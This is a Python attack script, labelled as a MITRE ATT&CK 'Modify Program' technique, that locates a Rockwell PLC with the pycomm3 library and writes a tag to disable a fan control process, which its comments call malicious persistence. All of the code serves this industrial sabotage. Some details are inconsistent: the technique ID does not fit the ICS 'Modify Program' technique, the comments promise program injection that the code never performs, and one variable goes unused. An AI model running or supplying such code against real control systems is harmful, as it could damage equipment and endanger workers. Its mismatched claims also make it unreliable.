# MITRE ATT&CK Technique: T1620.001 - Modify Program

import pycomm3
import time
import socket

# --- Configuration ---
# PLC connection details
CONTROLLER_NAME = 'YOUR_CONTROLLER_NAME'  # Replace with the actual controller name in your Rockwell environment.
PLC_IP = None  # Initially unknown, will be discovered

# Tag details
TARGET_PROGRAM = "Prog1"  # Name of the program to modify
TARGET_TAG = "Tog_Off"  # Tag to manipulate to trigger persistence
# Code injection parameters. Note that this will add an always-true 
# condition to the TONOFF_1.IN condition.
# By setting Tog_Off to TRUE, we can disable the Fan control.

# Modification Logic:  Create a new program that will disable the fan control.
# This is a simplified example.
#  The adversary would craft more sophisticated logic.
# The persistence is achieved by setting Tog_Off, which disables the normal Fan activation process

# --- Functions ---

def find_plc_ip_address(controller_name):
    """
    Discovers the IP address of a Rockwell PLC based on its controller name.

    Args:
        controller_name (str): The name of the PLC controller.

    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    try:
        # Use pycomm3's browse function to find the PLC
        devices = pycomm3.list_ab_devices()
        for device in devices:
            if device.get('product_name') == controller_name:
                return device.get('ip_address')
        print(f"PLC with name '{controller_name}' not found.")
        return None
    except Exception as e:
        print(f"Error discovering PLC: {e}")
        return None


def modify_plc_program(plc_ip, program_name, tag_to_modify, new_value):
    """
    Modifies a PLC program to inject malicious logic (persistence).

    Args:
        plc_ip (str): The IP address of the PLC.
        program_name (str): The name of the program to modify.
        tag_to_modify (str): The tag to manipulate to achieve persistence.
        new_value: The value to set the tag to.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            # Write the desired tag to the PLC. This will effectively
            # disable the fan.
            status = plc.write(tag_to_modify, new_value)

            if status:
              print(f"Successfully set tag {tag_to_modify} to {new_value} on PLC {plc_ip}.")
            else:
                print(f"Failed to set tag {tag_to_modify} to {new_value} on PLC {plc_ip}. Error: {status}")

    except pycomm3.exceptions.CommError as e:
        print(f"Communication error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

# --- Main Execution ---

if __name__ == "__main__":
    # 1. Discover the PLC's IP address
    PLC_IP = find_plc_ip_address(CONTROLLER_NAME)

    if not PLC_IP:
        print("Could not find PLC IP address. Exiting.")
        exit(1)

    print(f"Found PLC at IP address: {PLC_IP}")

    # 2. Implement the malicious logic (Modify Program)
    print("Executing persistence logic...")
    modify_plc_program(PLC_IP, TARGET_PROGRAM, TARGET_TAG, True) # Setting Tog_Off to TRUE to disable fan

    print("Persistence attempt complete.")